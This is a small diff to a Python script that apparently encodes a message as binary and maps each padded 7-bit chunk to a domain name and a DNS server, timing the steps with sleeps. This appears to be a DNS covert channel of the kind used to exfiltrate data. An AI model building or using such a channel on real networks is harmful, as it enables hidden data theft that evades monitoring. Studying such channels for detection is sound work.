@@ -96,6 +96,7 @@ binary = toBinary(message)
 print(binary)
 for char in binary:
     short_sleep()
+    char = str(char).zfill(7)  # Pad the binary string with zeros if needed
     domain_name = str(char)[:3]  # Domain name to query
     dns_server = str(char)[3:7]  # DNS server IP address
     domain_name = DNS_qname[str(int(domain_name, 2))]
